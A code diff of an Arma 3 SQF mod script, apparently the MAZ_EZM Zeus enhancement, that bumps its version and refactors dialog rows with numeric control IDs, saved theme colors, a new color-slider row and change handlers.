@@ -3,7 +3,7 @@ if(!isNull (findDisplay 312) && {!isNil "this"} && {!isNull this}) then {
 };
 
 [] spawn {
-MAZ_EZM_Version = "V2.1.2";
+MAZ_EZM_Version = "V2.1.3";
 MAZ_EZM_autoAdd = profileNamespace getVariable ["MAZ_EZM_autoAddVar",true];
 MAZ_EZM_spawnWithCrew = true;
 MAZ_EZM_nvgsOnlyAtNight = true;
@@ -11,15 +11,19 @@ MAZ_EZM_enableCleaner = profileNamespace getVariable ["MAZ_EZM_autoCleanerVar",t
 MAZ_EZM_stanceForAI = "UP";
 uiNamespace setVariable ["MAZ_EZM_activeWarnings",[]];
 uiNamespace setVariable ["MAZ_EZM_missingRespawnWarn",nil];
-MAZ_EZM_factionAddons = [];
-MAZ_EZM_moduleAddons = [];
+if(isNil "MAZ_EZM_factionAddons") then {
+	MAZ_EZM_factionAddons = [];
+};
+if(isNil "MAZ_EZM_moduleAddons") then {
+	MAZ_EZM_moduleAddons = [];
+};
 
 comment "Color Override";
-	EZM_themeColor = [0, 0.75, 0.75, 1];
-	EZM_zeusTransparency = profileNamespace getVariable ["MAZ_EZM_zeusTransparency_currentValue",1];	
-	EZM_dialogColor = [0,0.5,0.5,1];	
+	EZM_themeColor = profileNamespace getVariable ["MAZ_EZM_ThemeColor",[0, 0.75, 0.75, 1]];
+	uiNamespace setVariable ["EZM_themeColor", EZM_themeColor];
+	EZM_zeusTransparency = profileNamespace getVariable ["MAZ_EZM_Transparency",1];
+	EZM_dialogColor = profileNamespace getVariable ["MAZ_EZM_DialogColor",[0,0.5,0.5,1]];
 	EZM_dialogBackgroundCO = [0, 0, 0, 0.7];
-	uiNamespace setVariable ['EZM_themeColor', EZM_themeColor];
 
 comment "Dialog Creation";
 
@@ -57,25 +61,25 @@ comment "Dialog Creation";
 		showchat true;
 		private _display = findDisplay -1;
 
-		private _label = _display ctrlCreate ["RscText",IDC_TITLE];
+		private _label = _display ctrlCreate ["RscText",201];
 		_label ctrlSetPositionX (["X",6.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlSetPositionW (["W",27] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlSetPositionH (["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlSetBackgroundColor EZM_dialogColor;
 		_label ctrlCommit 0;
 
-		private _background = _display ctrlCreate ["RscText",IDC_BACKGROUND];
+		private _background = _display ctrlCreate ["RscText",202];
 		_background ctrlSetPositionX (["X",6.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_background ctrlSetPositionW (["W",27] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_background ctrlSetBackgroundColor EZM_dialogBackgroundCO;
 		_background ctrlCommit 0;
 
-		private _contentGroup = _display ctrlCreate ["RscControlsGroupNoScrollbars",IDC_CONTENT];
+		private _contentGroup = _display ctrlCreate ["RscControlsGroupNoScrollbars",203];
 		_contentGroup ctrlSetPositionX (["X",7] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_contentGroup ctrlSetPositionW (["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_contentGroup ctrlCommit 0;
 
-		private _okayButton = _display ctrlCreate ["RscButtonMenuOk",IDC_CONFIRM];
+		private _okayButton = _display ctrlCreate ["RscButtonMenuOk",204];
 		_okayButton ctrlSetPositionX (["X",28.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_okayButton ctrlSetPositionW (["W",5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_okayButton ctrlSetPositionH (["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
@@ -94,7 +98,7 @@ comment "Dialog Creation";
 		}];
 		_okayButton ctrlCommit 0;
 
-		private _cancelButton = _display ctrlCreate ["RscButtonMenuCancel",IDC_CANCEL];
+		private _cancelButton = _display ctrlCreate ["RscButtonMenuCancel",205];
 		_cancelButton ctrlSetPositionX (["X",6.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_cancelButton ctrlSetPositionW (["W",5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_cancelButton ctrlSetPositionH (["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
@@ -136,12 +140,12 @@ comment "Dialog Creation";
 
 	MAZ_EZM_fnc_createRowBase = {
 		params ["_display"];
-		private _contentGroup = _display displayCtrl IDC_CONTENT;
-		private _controlsGroupRow = _display ctrlCreate ["RscControlsGroupNoScrollbars",IDC_ROW_GROUP,_contentGroup];
+		private _contentGroup = _display displayCtrl 203;
+		private _controlsGroupRow = _display ctrlCreate ["RscControlsGroupNoScrollbars",210,_contentGroup];
 		_controlsGroupRow ctrlSetPosition [0,0,(["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
 		_controlsGroupRow ctrlCommit 0;
 
-		private _rowLabel = _display ctrlCreate ["RscText",IDC_ROW_LABEL,_controlsGroupRow];
+		private _rowLabel = _display ctrlCreate ["RscText",211,_controlsGroupRow];
 		_rowLabel ctrlSetPosition [0,0,(["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
 		_rowLabel ctrlSetBackgroundColor [0,0,0,0.5];
 		_rowLabel ctrlCommit 0;
@@ -149,229 +153,369 @@ comment "Dialog Creation";
 		_controlsGroupRow
 	};
 
-	MAZ_EZM_fnc_createComboRow = {
-		params ["_display","_defaultValue","_settings"];
-		_settings params ["_entries"];
+	MAZ_EZM_fnc_createColorRow = {
+		params ["_display","_data","_onChange"];
+		_data params [
+			["_rgb",[],[[]]]
+		];
+
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 
-		private _combo = _display ctrlCreate ["RscCombo",IDC_ROW_COMBO,_rowControlGroup];
-		_combo ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",15.9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-		_combo ctrlCommit 0;
+		private _doAlpha = (count _rgb) == 4;
+		private _endIndex = if(_doAlpha) then {237} else {235};
+		_rowControlGroup setVariable ["MAZ_EZM_doAlpha",_doAlpha];
 
-		{
-			_x params ["_value","_text","_tooltip","_picture","_textColor"];
+		private _rowColors = [
+			[1,0,0,1],
+			[0,1,0,1],
+			[0,0,1,1],
+			[1,1,1,1]
+		];
+		private _index = 0;
+		private _yPos = 0;
+		for "_i" from 230 to _endIndex step 2 do {
+			private _color = _rowColors # _index;
+			private _inactiveColor = +_color;
+			_inactiveColor set [3,0.6];
 
-			private _index = _combo lbAdd _text;
-			_combo lbSetTooltip [_index,_tooltip];
-			_combo lbSetPicture [_index,_picture];
-			_combo lbSetColor [_index,_textColor];
-			_combo setVariable [str _index,_value];
+			private _slider = _display ctrlCreate ["RscXSliderH",_i,_rowControlGroup];
+			_slider ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),_yPos,(["W",13.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+			_slider ctrlSetForegroundColor _inactiveColor;
+			_slider ctrlSetActiveColor _color;
+			_slider sliderSetRange [0, 1];
+			_slider sliderSetSpeed [0.1, 0.1];
+			_slider sliderSetPosition (_rgb # _index);
+			_slider ctrlCommit 0;
+			_slider setVariable ["MAZ_EZM_onChange",_onChange];
 
-			if(_value isEqualTo _defaultValue) then {
-				_combo lbSetCurSel _index;
-			};
-		} forEach _entries;
+			private _sliderEdit = _display ctrlCreate ["RscEdit",_i + 1,_rowControlGroup];
+			_sliderEdit ctrlSetPosition [(["W",23.7] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),_yPos + pixelH,(["W",2.3] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),((["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH)];
+			_sliderEdit ctrlSetTextColor [1,1,1,1];
+			_sliderEdit ctrlSetBackgroundColor [0,0,0,0.2];
+			_sliderEdit ctrlSetText (str (sliderPosition _slider));
+			_sliderEdit ctrlCommit 0;
+
+			_slider ctrlAddEventHandler ["sliderPosChanged", {
+				params ["_ctrlSlider", "_value"];
+				private _controlGroup = ctrlParentControlsGroup _ctrlSlider;
+				private _ctrlEdit = _controlGroup controlsGroupCtrl (ctrlIDC _ctrlSlider + 1);
+				private _roundedValue = (round (_value * 100) / 100);
+				_ctrlEdit ctrlSetText format ["%1",_roundedValue];
+
+				private _valueRGB = [_controlGroup] call (_controlGroup getVariable "controlValue");
+				private _picture = _controlGroup controlsGroupCtrl 238;
+				if(count _valueRGB == 4) then {
+					_picture ctrlSetText (format ["#(argb,8,8,3)color(%1,%2,%3,%4)",_valueRGB#0,_valueRGB#1,_valueRGB#2,_valueRGB#3]);
+				} else {
+					_picture ctrlSetText (format ["#(argb,8,8,3)color(%1,%2,%3,1)",_valueRGB#0,_valueRGB#1,_valueRGB#2]);
+				};
+				
+				[ctrlParent _ctrlSlider,_valueRGB] call (_ctrlSlider getVariable "MAZ_EZM_onChange");
+			}];
+
+			_sliderEdit ctrlAddEventHandler ["keyUp",{
+				params ["_control", "_key", "_shift", "_ctrl", "_alt"];
+				private _num = parseNumber (ctrlText _control);
+				private _ctrlGroup = ctrlParentControlsGroup _control;
+				private _sliderCtrl = _ctrlGroup controlsGroupCtrl (ctrlIDC _control - 1);
+				_sliderCtrl sliderSetPosition _num;
+			}];	
+
+			_yPos = _yPos + (["H",1.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
+			_index = _index + 1;
+		};	
+
+		private _picture = _display ctrlCreate ["RscPicture",238,_rowControlGroup];
+		if(_doAlpha) then {
+			_picture ctrlSetText (format ["#(argb,8,8,3)color(%1,%2,%3,%4)",_rgb#0,_rgb#1,_rgb#2,_rgb#3]);
+		} else {
+			_picture ctrlSetText (format ["#(argb,8,8,3)color(%1,%2,%3,1)",_rgb#0,_rgb#1,_rgb#2]);
+		};
+		_picture ctrlSetPosition [0,(["H",1.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),_yPos - (["H",1.2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+		_picture ctrlCommit 0;
+
+		_rowControlGroup ctrlSetPositionH _yPos;
+		_rowControlGroup ctrlCommit 0;
 
 		_rowControlGroup setVariable ["controlValue",{
 			params ["_controlsGroup"];
 
-			private _ctrlCombo = _controlsGroup controlsGroupCtrl IDC_ROW_COMBO;
-			_ctrlCombo getVariable str lbCurSel _ctrlCombo
+			private _doAlpha = _controlsGroup getVariable ["MAZ_EZM_doAlpha",false];
+			private _endIndex = if(_doAlpha) then {237} else {235};
+			private _rgb = [];
+			for "_i" from 230 to _endIndex step 2 do {
+				private _slider = _controlsGroup controlsGroupCtrl _i;
+				private _value = sliderPosition _slider;
+				_rgb pushBack (round (_value * 100) / 100);
+			};
+			if(!_doAlpha) then {_rgb pushBack 1};
+			_rgb;
+		}];
+
+		_rowControlGroup
+	};
+
+	MAZ_EZM_fnc_createComboRow = {
+		params ["_display","_data","_onChange"];
+		_data params [
+			["_comboData",[],[[]]],
+			["_comboNames",[],[[]]],
+			["_defaultIndex",0,[0]]
+		];
+		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
+
+		private _combo = _display ctrlCreate ["RscCombo",213,_rowControlGroup];
+		_combo ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",15.9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+		_combo ctrlCommit 0;
+
+		_combo setVariable ["MAZ_EZM_onChange",_onChange];
+
+		_combo ctrlAddEventHandler ["lbSelChanged", {
+			params ["_control", "_lbCurSel", "_lbSelection"];
+			[ctrlParent _control,_lbSelection] call (_control getVariable "MAZ_EZM_onChange");
+		}];
+
+		for "_i" from 0 to (count _comboNames - 1) do {
+			private _data = if(count _comboData <= _i) then {str _i} else {_comboData # _i};
+			private _text = _comboNames # _i;
+			
+			_text params ["_text",["_tooltip",""],["_icon",""],["_textColor",[1,1,1,1]]];
+
+			private _index = _combo lbAdd _text;
+			_combo lbSetTooltip [_index,_tooltip];
+			_combo lbSetPicture [_index,_icon];
+			_combo lbSetColor [_index,_textColor];
+			_combo lbSetData [_index,_data];
+			
+			if(_i == _defaultIndex) then {
+				_combo lbSetCurSel _i;
+			};
+		};
+
+		_rowControlGroup setVariable ["controlValue",{
+			params ["_controlsGroup"];
+
+			private _ctrlCombo = _controlsGroup controlsGroupCtrl 213;
+			private _index = lbCurSel _ctrlCombo;
+			_ctrlCombo lbData _index;
 		}];
 
 		_rowControlGroup
 	};
 
 	MAZ_EZM_fnc_createEditRow = {
-		params ["_display","_defaultValue","_settings"];
-		_settings params ["_height"];
+		params ["_display","_data","_onChange"];
+		_data params ["_defaultText",["_height",1]];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
+		_rowControlGroup ctrlSetPositionH (["H",_height] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
+		_rowControlGroup ctrlCommit 0;
 
-		private _edit = _display ctrlCreate ["RscEdit",IDC_ROW_EDIT,_rowControlGroup];
-		_edit ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),pixelH,(["W",15.9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH];
+		private _edit = _display ctrlCreate ["RscEdit",214,_rowControlGroup];
+		_edit ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),pixelH,(["W",15.9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",_height] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH];
 		_edit ctrlSetTextColor [1,1,1,1];
 		_edit ctrlSetBackgroundColor [0,0,0,0.2];
 		_edit ctrlCommit 0;
+		
+		_edit setVariable ["MAZ_EZM_onChange",_onChange];
 
-		_edit ctrlSetText _defaultValue;
+		_edit ctrlAddEventHandler ["KeyUp", {
+			params ["_control", "_key", "_shift", "_ctrl", "_alt"];
+			[ctrlParent _control,ctrlText _control] call (_control getVariable "MAZ_EZM_onChange");
+		}];
+
+		_edit ctrlSetText _defaultText;
 
 		_rowControlGroup setVariable ["controlValue", {
 			params ["_controlsGroup"];
-			ctrlText (_controlsGroup controlsGroupCtrl IDC_ROW_EDIT)
+			ctrlText (_controlsGroup controlsGroupCtrl 214)
 		}];
 
 		_rowControlGroup
 	};
 
 	MAZ_EZM_fnc_createEditMultiRow = {
-		params ["_display","_defaultValue","_settings"];
-		_settings params [["_height",4]];
+		params ["_display","_data","_onChange"];
+		_data params ["_defaultText",["_height",4]];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 		_rowControlGroup ctrlSetPositionH (["H",_height + 1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_rowControlGroup ctrlCommit 0;
 
-		private _label = _rowControlGroup controlsGroupCtrl IDC_ROW_LABEL;
+		private _label = _rowControlGroup controlsGroupCtrl 211;
 		_label ctrlSetPositionW (["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlCommit 0;
 
-		private _edit = _display ctrlCreate ["RscEditMulti",IDC_ROW_EDIT,_rowControlGroup];
-		_edit ctrlSetPosition [pixelW,(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelW,(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH];
-		_edit ctrlSetPositionH (["H",_height] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
+		private _edit = _display ctrlCreate ["RscEditMulti",214,_rowControlGroup];
+		_edit ctrlSetPosition [pixelW,(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelW,(["H",_height] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH];
 		_edit ctrlSetTextColor [1,1,1,1];
 		_edit ctrlSetBackgroundColor [0,0,0,0.2];
-		_edit ctrlSetText _defaultValue;
+		_edit ctrlSetText _defaultText;
 		_edit ctrlCommit 0;
+
+		_edit setVariable ["MAZ_EZM_onChange",_onChange];
+		
+		_edit ctrlAddEventHandler ["KeyUp", {
+			params ["_control", "_key", "_shift", "_ctrl", "_alt"];
+			[ctrlParent _control,ctrlText _control] call (_control getVariable "MAZ_EZM_onChange");
+		}];
 
 		_rowControlGroup setVariable ["controlValue", {
 			params ["_controlsGroup"];
-			ctrlText (_controlsGroup controlsGroupCtrl IDC_ROW_EDIT)
+			ctrlText (_controlsGroup controlsGroupCtrl 214)
 		}];
 
 		_rowControlGroup
 	};
 
-	MAZ_EZM_fnc_createEditCodeRow = {
-		params ["_display","_defaultValue","_settings"];
-		_settings params ["_height"];
-		private _rowControlGroup = [_display,_defaultValue,[_height]] call MAZ_EZM_fnc_createEditMultiRow;
-
-		private _execButton = _display displayCtrl IDC_CONFIRM;
-		_execButton ctrlSetText "Exec";
-		_execButton ctrlCommit 0;
-
-		private _edit = _display displayCtrl IDC_ROW_EDIT;
-		_edit ctrlSetTextColor [1,1,1,1];
-		_edit ctrlSetBackgroundColor [0,0,0,0.5];
-		_edit ctrlSetFont "EtelkaMonospacePro";
-		_edit ctrlSetFontHeight 0.03;
-		_edit ctrlSetText _defaultValue;
-		_edit ctrlCommit 0;
-
-		_rowControlGroup
-	};
-
 	MAZ_EZM_fnc_createListRow = {
-		params ["_display","_defaultValue","_settings"];
-		_settings params ["_entries","_height"];
+		params ["_display","_data","_onChange"];
+		_data params [
+			["_listData",[],[[]]],
+			["_listNames",[],[[]]],
+			["_defaultIndex",0,[0]],
+			["_height",6,[6]]
+		];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 		_rowControlGroup ctrlSetPositionH (["H",_height + 1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_rowControlGroup ctrlCommit 0;
 
-		private _label = _rowControlGroup controlsGroupCtrl IDC_ROW_LABEL;
+		private _label = _rowControlGroup controlsGroupCtrl 211;
 		_label ctrlSetPositionW (["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlCommit 0;
 
-		private _listBox = _display ctrlCreate ["RscListBox",IDC_ROW_COMBO,_rowControlGroup];
+		private _listBox = _display ctrlCreate ["RscListBox",213,_rowControlGroup];
 		_listBox ctrlSetPosition [0,(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",6] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
 		_listBox ctrlSetPositionH (["H",_height] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_listBox ctrlCommit 0;
 
-		{
-			_x params ["_value","_text","_tooltip","_picture","_textColor"];
+		_listBox setVariable ["MAZ_EZM_onChange",_onChange];
+
+		_listBox ctrlAddEventHandler ["lbSelChanged", {
+			params ["_control", "_lbCurSel", "_lbSelection"];
+			[ctrlParent _control,_lbSelection] call (_control getVariable "MAZ_EZM_onChange");
+		}];
+
+		for "_i" from 0 to (count _listNames - 1) do {
+			private _data = if(count _listData <= _i) then {str _i} else {_listData # _i};
+			private _text = _listNames # _i;
+			
+			_text params ["_text",["_tooltip",""],["_icon",""],["_textColor",[1,1,1,1]]];
 
 			private _index = _listBox lbAdd _text;
 			_listBox lbSetTooltip [_index,_tooltip];
-			_listBox lbSetPicture [_index,_picture];
+			_listBox lbSetPicture [_index,_icon];
 			_listBox lbSetColor [_index,_textColor];
-			_listBox setVariable [str _index,_value];
-
-			if(_value isEqualTo _defaultValue) then {
-				_listBox lbSetCurSel _index;
+			_listBox lbSetData [_index,_data];
+			
+			if(_i == _defaultIndex) then {
+				_listBox lbSetCurSel _i;
 			};
-		} forEach _entries;
+		};
+
 		_listBox lbAdd " ";
+
+		"TODO : See if this is needed.";
+		'_listBox lbAdd " ";
 		_listBox lbAdd "  ";
-		_listBox lbAdd "   ";
+		_listBox lbAdd "   "';
 
 		_rowControlGroup setVariable ["controlValue",{
 			params ["_controlsGroup"];
 
-			private _ctrlCombo = _controlsGroup controlsGroupCtrl IDC_ROW_COMBO;
-			_ctrlCombo getVariable str lbCurSel _ctrlCombo
+			private _ctrlList = _controlsGroup controlsGroupCtrl 213;
+			private _index = lbCurSel _ctrlList;
+			_ctrlList lbData _index;
 		}];
 
 		_rowControlGroup
 	};
 
 	MAZ_EZM_fnc_createSidesRow = {
-		params ["_display","_defaultValue","_settings"];
+		params ["_display","_data","_onChange"];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 
 		_rowControlGroup ctrlSetPositionH (["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
+		
+		"Elements";
 
-		private _label = _rowControlGroup controlsGroupCtrl IDC_ROW_LABEL;
-		_label ctrlSetPositionH (["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
-		_label ctrlCommit 0;
+			private _label = _rowControlGroup controlsGroupCtrl 211;
+			_label ctrlSetPositionH (["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
+			_label ctrlCommit 0;
 
-		private _background = _display ctrlCreate ["RscText",-1,_rowControlGroup];
-		_background ctrlSetBackgroundColor [0,0,0,0.6];
-		_background ctrlSetPosition [(["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",16] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-		_background ctrlSetTextColor [1,1,1,0.5];
-		_background ctrlCommit 0;
+			private _background = _display ctrlCreate ["RscText",-1,_rowControlGroup];
+			_background ctrlSetBackgroundColor [0,0,0,0.6];
+			_background ctrlSetPosition [(["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",16] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+			_background ctrlSetTextColor [1,1,1,0.5];
+			_background ctrlCommit 0;
 
-		private _sidesGroup = _display ctrlCreate ["RscControlsGroupNoScrollbars",IDC_ROW_SIDES,_rowControlGroup];
-		_sidesGroup ctrlSetPosition [(["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",16] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-		_sidesGroup ctrlCommit 0;
+			private _sidesGroup = _display ctrlCreate ["RscControlsGroupNoScrollbars",217,_rowControlGroup];
+			_sidesGroup ctrlSetPosition [(["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",16] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+			_sidesGroup ctrlCommit 0;
 
-		private _blufor = _display ctrlCreate ["RscActivePicture",IDC_SIDES_BLUFOR,_sidesGroup];
-		_blufor ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_west_ca.paa";
-		_blufor ctrlSetPosition [(["W",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-		_blufor ctrlCommit 0;
+			private _blufor = _display ctrlCreate ["RscActivePicture",250,_sidesGroup];
+			_blufor ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_west_ca.paa";
+			_blufor ctrlSetPosition [(["W",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+			_blufor ctrlCommit 0;
 
-		private _opfor = _display ctrlCreate ["RscActivePicture",IDC_SIDES_OPFOR,_sidesGroup];
-		_opfor ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_east_ca.paa";
-		_opfor ctrlSetPosition [(["W",5.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-		_opfor ctrlCommit 0;
+			private _opfor = _display ctrlCreate ["RscActivePicture",251,_sidesGroup];
+			_opfor ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_east_ca.paa";
+			_opfor ctrlSetPosition [(["W",5.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+			_opfor ctrlCommit 0;
 
-		private _indep = _display ctrlCreate ["RscActivePicture",IDC_SIDES_INDEPENDENT,_sidesGroup];
-		_indep ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_guer_ca.paa";
-		_indep ctrlSetPosition [(["W",8.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-		_indep ctrlCommit 0;
+			private _indep = _display ctrlCreate ["RscActivePicture",252,_sidesGroup];
+			_indep ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_guer_ca.paa";
+			_indep ctrlSetPosition [(["W",8.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+			_indep ctrlCommit 0;
 
-		private _civ = _display ctrlCreate ["RscActivePicture",IDC_SIDES_CIVILIAN,_sidesGroup];
-		_civ ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_civ_ca.paa";
-		_civ ctrlSetPosition [(["W",11.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-		_civ ctrlCommit 0;
+			private _civ = _display ctrlCreate ["RscActivePicture",253,_sidesGroup];
+			_civ ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_civ_ca.paa";
+			_civ ctrlSetPosition [(["W",11.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+			_civ ctrlCommit 0;
 
-		if (_defaultValue isEqualType []) then {
-			_defaultValue = +_defaultValue;
-		};
+		"Functionality";
 
-		private _allowMultiple = _defaultValue isEqualType [];
-		_sidesGroup setVariable ["controlValue",_defaultValue];
+		private _allowMultiple = if(typeName _data == "ARRAY") then {
+			_data = +_data;
+			true;
+		} else {false};
+
+		_sidesGroup setVariable ["controlValue",_data];
+		_sidesGroup setVariable ["MAZ_EZM_onChange",_onChange];
 
 		private _controls = [];
-		private _IDCs = [IDC_SIDES_OPFOR,IDC_SIDES_BLUFOR,IDC_SIDES_INDEPENDENT,IDC_SIDES_CIVILIAN];
+		private _IDCs = [251,250,252,253];
 		{
 			private _sideCtrl = _sidesGroup controlsGroupCtrl _x;
 			private _color = [_forEachIndex] call BIS_fnc_sideColor;
 			private _side = [_forEachIndex] call BIS_fnc_sideType;
+			_sideCtrl setVariable ["MAZ_EZM_SIDE",_side];
 
-			_sideCtrl ctrlSetActiveColor _color;
-			if(_allowMultiple) then {
-				if(_side in _defaultValue) then {
-					[_sideCtrl,1.2,0] call BIS_fnc_ctrlSetScale;
+			"Setup initial values";
+				_sideCtrl ctrlSetActiveColor _color;
+				if(_allowMultiple) then {
+					if(_side in _data) then {
+						[_sideCtrl,1.2,0] call BIS_fnc_ctrlSetScale;
+					} else {
+						_color set [3,0.5];
+					};
 				} else {
-					_color set [3,0.5];
+					if(_side isEqualTo _data) then {
+						[_sideCtrl,1.2,0] call BIS_fnc_ctrlSetScale;
+					} else {
+						_color set [3,0.5];
+					};
 				};
-			} else {
-				if(_side isEqualTo _defaultValue) then {
-					[_sideCtrl,1.2,0] call BIS_fnc_ctrlSetScale;
-				} else {
-					_color set [3,0.5];
-				};
-			};
-			_sideCtrl ctrlSetTextColor _color;
+				_sideCtrl ctrlSetTextColor _color;
 
+			"If multiple selections";
 			if(_allowMultiple) then {
